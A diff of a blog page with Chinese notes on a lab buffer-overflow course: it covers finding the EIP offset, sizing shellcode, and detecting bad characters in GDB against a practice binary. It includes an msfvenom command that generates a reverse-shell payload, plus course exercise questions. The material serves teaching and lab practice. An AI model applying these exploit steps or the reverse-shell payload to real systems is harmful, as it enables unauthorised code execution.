@@ -190,7 +190,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/base" style=color:#ffa2c4>
+                <a href="/tags/base" style=color:#00a596>
                     base
                 </a>
             </span>
@@ -207,7 +207,7 @@
     </div>
 
     <div class="content" v-pre>
-        <h1 id="Take-Control-of-EIP"><a href="#Take-Control-of-EIP" class="headerlink" title="Take Control of EIP"></a>Take Control of EIP</h1><p>基于堆栈的缓冲区溢出最重要的一个方面是控制指令指针（EIP），这样我们就可以告诉它应该跳转到哪个地址。这将使EIP指向外壳代码开始的地址，并使CPU执行它。 我们可以使用Python在GDB中执行命令，Python直接作为输入。</p>
+        <h1 id="Take-Control-of-EIP"><a href="#Take-Control-of-EIP" class="headerlink" title="Take Control of EIP"></a>Take Control of EIP</h1><p>基于堆栈的缓冲区溢出最重要的一个方面是控制指令指针（EIP），这样我们就可以告诉它应该跳转到哪个地址。这将使EIP指向shell代码开始的地址，并使CPU执行它。 我们可以使用Python在GDB中执行命令，Python直接作为输入。</p>
 <span id="more"></span>
 
 <h4 id="Segmentation-Fault"><a href="#Segmentation-Fault" class="headerlink" title="Segmentation Fault"></a>Segmentation Fault</h4><pre><code class="shell-session">student@nix-bow:~$ gdb -q bow32
@@ -260,6 +260,213 @@ Program received signal SIGSEGV, Segmentation fault.
 <h4 id="GDB-EIP"><a href="#GDB-EIP" class="headerlink" title="GDB - EIP"></a>GDB - EIP</h4><pre><code class="shell-session">(gdb) info registers eip
 
 eip            0x69423569	0x69423569
+</code></pre>
+<p>我们看到EIP显示了一个不同的内存地址，我们可以使用另一个名为“pattern_offset”的MSF工具来计算前进到EIP所需的确切字符数（偏移量）。</p>
+<h4 id="GDB-Offset"><a href="#GDB-Offset" class="headerlink" title="GDB - Offset"></a>GDB - Offset</h4><pre><code class="shell-session">Tanin@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569
+
+[*] Exact match at offset 1036
+</code></pre>
+<h4 id="Buffer-1"><a href="#Buffer-1" class="headerlink" title="Buffer"></a>Buffer</h4><p><img src="https://academy.hackthebox.com/storage/modules/31/buffer_overflow_3.png" alt="image"></p>
+<p>如果我们现在将这个字节数精确地用于我们的“U”，那么我们应该正好落在EIP上。要覆盖它并检查我们是否按计划到达它，我们可以用“\x66”再添加4个字节并执行它，以确保我们控制EIP。</p>
+<h4 id="GDB-Offset-1"><a href="#GDB-Offset-1" class="headerlink" title="GDB Offset"></a>GDB Offset</h4><pre><code class="shell-session">(gdb) run $(python -c &quot;print &#39;\x55&#39; * 1036 + &#39;\x66&#39; * 4&quot;)
+
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/student/bow/bow32 $(python -c &quot;print &#39;\x55&#39; * 1036 + &#39;\x66&#39; * 4&quot;)
+Program received signal SIGSEGV, Segmentation fault.
+0x66666666 in ?? ()
+</code></pre>
+<h4 id="Buffer-2"><a href="#Buffer-2" class="headerlink" title="Buffer"></a>Buffer</h4><p><img src="https://academy.hackthebox.com/storage/modules/31/buffer_overflow_4.png" alt="image"></p>
+<p>现在我们看到我们已经用“\x66”字符覆盖了EIP。接下来，我们必须找出我们的shell代码有多少空间，然后shell代码执行我们想要的命令。当我们现在控制EIP时，我们稍后将用指向shell代码开头的地址覆盖它。</p>
+<h4 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h4><pre><code>target:10.129.42.190
+检查寄存器并提交EBP地址作为答案。
+</code></pre>
+<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20230625210417868.png" alt="image-20230625210417868"></p>
+<h1 id="Determine-the-Length-for-Shellcode"><a href="#Determine-the-Length-for-Shellcode" class="headerlink" title="Determine the Length for Shellcode"></a>Determine the Length for Shellcode</h1><p>现在，我们应该知道我们有多少空间让shell代码执行我们想要的操作。利用这样的漏洞获得反向shell对我们来说是一种潮流和有用的做法。首先，我们必须大致了解我们将插入的shell代码有多大，为此，我们将使用msfvenom。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c
+
+No encoder or badchars specified, outputting raw payload
+Payload size: 68 bytes
+&lt;SNIP&gt;
+</code></pre>
+<p>我们现在知道我们的有效载荷大约是68字节。作为预防措施，如果由于后来的规范导致外shell码增加，我们应该尝试采用更大的范围。 通常，在shell代码开始之前插入一些无操作指令（NOPS）会很有用，这样它就可以干净地执行。让我们简要总结一下我们需要做些什么：</p>
+<ul>
+<li>我们总共需要1040个字节才能到达EIP。</li>
+<li>在这里，我们可以使用额外的100字节NOP </li>
+<li>150字节用于我们的外壳代码。</li>
+</ul>
+<pre><code class="shell-session">   Buffer = &quot;\x55&quot; * (1040 - 100 - 150 - 4) = 786
+     NOPs = &quot;\x90&quot; * 100
+Shellcode = &quot;\x44&quot; * 150
+      EIP = &quot;\x66&quot; * 4&#39;
+</code></pre>
+<h4 id="Buffer-3"><a href="#Buffer-3" class="headerlink" title="Buffer"></a>Buffer</h4><p><img src="https://academy.hackthebox.com/storage/modules/31/buffer_overflow_8.png" alt="image"></p>
+<p>现在我们可以试着找出我们有多少可用空间来插入外壳代码。</p>
+<pre><code class="shell-session">(gdb) run $(python -c &#39;print &quot;\x55&quot; * (1040 - 100 - 150 - 4) + &quot;\x90&quot; * 100 + &quot;\x44&quot; * 150 + &quot;\x66&quot; * 4&#39;)
+
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/student/bow/bow32 $(python -c &#39;print &quot;\x55&quot; * (1040 - 100 - 150 - 4) + &quot;\x90&quot; * 100 + &quot;\x44&quot; * 150 + &quot;\x66&quot; * 4&#39;)
+Program received signal SIGSEGV, Segmentation fault.
+0x66666666 in ?? ()
+</code></pre>
+<h4 id="Buffer-4"><a href="#Buffer-4" class="headerlink" title="Buffer"></a>Buffer</h4><p><img src="https://academy.hackthebox.com/storage/modules/31/buffer_overflow_7.png" alt="image"></p>
+<h4 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h4><pre><code>target:
+如果我们把NOPS和shell代码大小计算在一起，我们的shell代码理论上能变成多大？（格式：00字节）
+</code></pre>
+<h1 id="Identification-of-Bad-Characters"><a href="#Identification-of-Bad-Characters" class="headerlink" title="Identification of Bad Characters"></a>Identification of Bad Characters</h1><p>以前在类UNIX操作系统中，二进制文件以两个字节开头，其中包含一个决定文件类型的“幻数”。一开始，这是用来识别不同平台的对象文件的。渐渐地，这个概念被转移到了其他文件中，现在几乎每个文件都包含一个神奇的数字。 这样的保留字符也存在于应用程序中，但它们并不总是出现，也不总是相同的。这些保留字符，也被称为坏字符，可能会有所不同，但我们经常会看到这样的字符：</p>
+<ul>
+<li><code>\x00</code> - Null Byte</li>
+<li><code>\x0A</code> - Line Feed</li>
+<li><code>\x0D</code> - Carriage Return</li>
+<li><code>\xFF</code> - Form Feed</li>
+</ul>
+<p>在这里，我们使用以下字符列表来找出生成外壳代码时必须考虑和避免的所有字符。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ CHARS=&quot;\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;
+</code></pre>
+<p>为了计算CHARS变量中的字节数，我们可以使用bash，将“\x”替换为空格，然后使用wc对单词进行计数。</p>
+<h4 id="Calculate-CHARS-Length"><a href="#Calculate-CHARS-Length" class="headerlink" title="Calculate CHARS Length"></a>Calculate CHARS Length</h4><pre><code class="shell-session">Tanin@htb[/htb]$ echo $CHARS | sed &#39;s/\\x/ /g&#39; | wc -w
+
+256
+</code></pre>
+<p>此字符串长度为256字节。所以我们需要重新计算我们的缓冲区。</p>
+<h4 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h4><pre><code class="shell-session">Buffer = &quot;\x55&quot; * (1040 - 256 - 4) = 780
+ CHARS = &quot;\x00\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfd\xfe\xff&quot;
+   EIP = &quot;\x66&quot; * 4
+</code></pre>
+<p>现在让我们来看看整个主要功能。因为如果我们现在执行它，程序就会崩溃，而不会让我们有可能跟踪内存中发生的事情。因此，我们将在相应的函数处设置一个断点，以便在此时停止执行，并且我们可以分析内存的内容。</p>
+<pre><code class="shell-session">(gdb) disas main
+Dump of assembler code for function main:
+   0x56555582 &lt;+0&gt;: 	lea    ecx,[esp+0x4]
+   0x56555586 &lt;+4&gt;: 	and    esp,0xfffffff0
+   0x56555589 &lt;+7&gt;: 	push   DWORD PTR [ecx-0x4]
+   0x5655558c &lt;+10&gt;:	push   ebp
+   0x5655558d &lt;+11&gt;:	mov    ebp,esp
+   0x5655558f &lt;+13&gt;:	push   ebx
+   0x56555590 &lt;+14&gt;:	push   ecx
+   0x56555591 &lt;+15&gt;:	call   0x56555450 &lt;__x86.get_pc_thunk.bx&gt;
+   0x56555596 &lt;+20&gt;:	add    ebx,0x1a3e
+   0x5655559c &lt;+26&gt;:	mov    eax,ecx
+   0x5655559e &lt;+28&gt;:	mov    eax,DWORD PTR [eax+0x4]
+   0x565555a1 &lt;+31&gt;:	add    eax,0x4
+   0x565555a4 &lt;+34&gt;:	mov    eax,DWORD PTR [eax]
+   0x565555a6 &lt;+36&gt;:	sub    esp,0xc
+   0x565555a9 &lt;+39&gt;:	push   eax
+   0x565555aa &lt;+40&gt;:	call   0x5655554d &lt;bowfunc&gt;		# &lt;---- bowfunc Function
+   0x565555af &lt;+45&gt;:	add    esp,0x10
+   0x565555b2 &lt;+48&gt;:	sub    esp,0xc
+   0x565555b5 &lt;+51&gt;:	lea    eax,[ebx-0x1974]
+   0x565555bb &lt;+57&gt;:	push   eax
+   0x565555bc &lt;+58&gt;:	call   0x565553e0 &lt;puts@plt&gt;
+   0x565555c1 &lt;+63&gt;:	add    esp,0x10
+   0x565555c4 &lt;+66&gt;:	mov    eax,0x1
+   0x565555c9 &lt;+71&gt;:	lea    esp,[ebp-0x8]
+   0x565555cc &lt;+74&gt;:	pop    ecx
+   0x565555cd &lt;+75&gt;:	pop    ebx
+   0x565555ce &lt;+76&gt;:	pop    ebp
+   0x565555cf &lt;+77&gt;:	lea    esp,[ecx-0x4]
+   0x565555d2 &lt;+80&gt;:	ret    
+End of assembler dump.
+</code></pre>
+<p>为了设置断点，我们给命令“break”赋予相应的函数名。</p>
+<h4 id="GDB-Breakpoint"><a href="#GDB-Breakpoint" class="headerlink" title="GDB Breakpoint"></a>GDB Breakpoint</h4><pre><code class="shell-session">(gdb) break bowfunc 
+
+Breakpoint 1 at 0x56555551
+</code></pre>
+<p>现在，我们可以执行新创建的输入并查看内存。</p>
+<pre><code class="shell-session">(gdb) run $(python -c &#39;print &quot;\x55&quot; * (1040 - 256 - 4) + &quot;\x00\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfc\xfd\xfe\xff&quot; + &quot;\x66&quot; * 4&#39;)
+
+Starting program: /home/student/bow/bow32 $(python -c &#39;print &quot;\x55&quot; * (1040 - 256 - 4) + &quot;\x00\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfc\xfd\xfe\xff&quot; + &quot;\x66&quot; * 4&#39;)
+/bin/bash: warning: command substitution: ignored null byte in input
+
+Breakpoint 1, 0x56555551 in bowfunc ()
+</code></pre>
+<p>在我们用坏字符执行缓冲区并到达断点之后，我们可以查看堆栈。</p>
+<h4 id="The-Stack"><a href="#The-Stack" class="headerlink" title="The Stack"></a>The Stack</h4><pre><code class="shell-session">(gdb) x/2000xb $esp+500
+
+0xffffd28a:	0xbb	0x69	0x36	0x38	0x36	0x00	0x00	0x00
+0xffffd292:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0xffffd29a:	0x00	0x2f	0x68	0x6f	0x6d	0x65	0x2f	0x73
+0xffffd2a2:	0x74	0x75	0x64	0x65	0x6e	0x74	0x2f	0x62
+0xffffd2aa:	0x6f	0x77	0x2f	0x62	0x6f	0x77	0x33	0x32
+0xffffd2b2:	0x00    0x55	0x55	0x55	0x55	0x55	0x55	0x55
+                 # |---&gt; &quot;\x55&quot;s begin
+
+0xffffd2ba: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
+0xffffd2c2: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
+&lt;SNIP&gt;
+</code></pre>
+<p>在这里，我们认识到我们的“\x55”是从哪个地址开始的。从这里，我们可以走得更远，寻找CHARS的起点。</p>
+<h4 id="The-Stack-CHARS"><a href="#The-Stack-CHARS" class="headerlink" title="The Stack - CHARS"></a>The Stack - CHARS</h4><pre><code class="shell-session">&lt;SNIP&gt;
+0xffffd5aa:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
+0xffffd5b2:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
+0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
+                                                 # |---&gt; CHARS begin
+
+0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
+0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
+0xffffd5d2:	0x15	0x16	0x17	0x18	0x19	0x1a	0x1b	0x1c
+&lt;SNIP&gt;
+</code></pre>
+<p>我们看到“\x55”在哪里结束，CHARS变量在哪里开始。但如果我们仔细观察它，我们会发现它以“\x01”而不是“\x00”开头。我们已经在执行过程中看到了输入中的空字节被忽略的警告。 因此，我们可以注意到这个字符，将其从变量CHARS中删除，并调整“\x55”的编号。</p>
+<h4 id="Notes-1"><a href="#Notes-1" class="headerlink" title="Notes"></a>Notes</h4><pre><code class="shell-session"># Substract the number of removed characters
+Buffer = &quot;\x55&quot; * (1040 - 255 - 4) = 781
+
+# &quot;\x00&quot; removed: 256 - 1 = 255 bytes
+ CHARS = &quot;\x01\x02\x03...&lt;SNIP&gt;...\xfd\xfe\xff&quot;
+ 
+   EIP = &quot;\x66&quot; * 4
+</code></pre>
+<h4 id="Send-CHARS-Without-Null-Byte"><a href="#Send-CHARS-Without-Null-Byte" class="headerlink" title="Send CHARS - Without Null Byte"></a>Send CHARS - Without Null Byte</h4><pre><code class="shell-session">(gdb) run $(python -c &#39;print &quot;\x55&quot; * (1040 - 255 - 4) + &quot;\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfc\xfd\xfe\xff&quot; + &quot;\x66&quot; * 4&#39;)
+
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/student/bow/bow32 $(python -c &#39;print &quot;\x55&quot; * (1040 - 255 - 4) + &quot;\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfc\xfd\xfe\xff&quot; + &quot;\x66&quot; * 4&#39;)
+Breakpoint 1, 0x56555551 in bowfunc ()
+</code></pre>
+<h4 id="The-Stack-1"><a href="#The-Stack-1" class="headerlink" title="The Stack"></a>The Stack</h4><pre><code class="shell-session">(gdb) x/2000xb $esp+550
+
+&lt;SNIP&gt;
+0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
+0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
+                                                 # |----| &lt;- &quot;\x09&quot; expected
+
+0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
+&lt;SNIP&gt;
+</code></pre>
+<p>在这里，它取决于我们的字节在变量CHARS中的正确顺序，以查看是否有任何字符更改、中断或跳过顺序。现在我们认识到，在“\x08”之后，我们遇到的是“\x00”，而不是预期的“\x09”。这告诉我们，此处不允许使用此字符，必须相应地删除。</p>
+<h4 id="Notes-2"><a href="#Notes-2" class="headerlink" title="Notes"></a>Notes</h4><pre><code class="shell-session"># Substract the number of removed characters
+Buffer = &quot;\x55&quot; * (1040 - 254 - 4) = 782	
+
+# &quot;\x00&quot; &amp; &quot;\x09&quot; removed: 256 - 2 = 254 bytes
+ CHARS = &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...&lt;SNIP&gt;...\xfd\xfe\xff&quot; 
+ 
+   EIP = &quot;\x66&quot; * 4
+</code></pre>
+<h4 id="Send-CHARS-Without-“-x00”-amp-“-x09”"><a href="#Send-CHARS-Without-“-x00”-amp-“-x09”" class="headerlink" title="Send CHARS - Without “\x00” &amp; “\x09”"></a>Send CHARS - Without “\x00” &amp; “\x09”</h4><pre><code class="shell-session">(gdb) run $(python -c &#39;print &quot;\x55&quot; * (1040 - 254 - 4) + &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...&lt;SNIP&gt;...\xfc\xfd\xfe\xff&quot; + &quot;\x66&quot; * 4&#39;)
+
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/student/bow/bow32 $(python -c &#39;print &quot;\x55&quot; * (1040 - 254 - 4) + &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...&lt;SNIP&gt;...\xfc\xfd\xfe\xff&quot; + &quot;\x66&quot; * 4&#39;)
+Breakpoint 1, 0x56555551 in bowfunc ()
+</code></pre>
+<h4 id="The-Stack-2"><a href="#The-Stack-2" class="headerlink" title="The Stack"></a>The Stack</h4><pre><code class="shell-session">(gdb) x/2000xb $esp+550
+
+&lt;SNIP&gt;
+0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
+0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
+                                                 # |----| &lt;- &quot;\x0a&quot; expected
+
+0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
+&lt;SNIP&gt;
+</code></pre>
+<p>必须重复此过程，直到删除所有可能中断流的字符为止。</p>
+<h4 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h4><pre><code>target:
+找到所有更改或中断发送字节顺序的坏字符，并将其作为答案提交（例如，格式：\x0\x11）。
 </code></pre>
 
     </div>
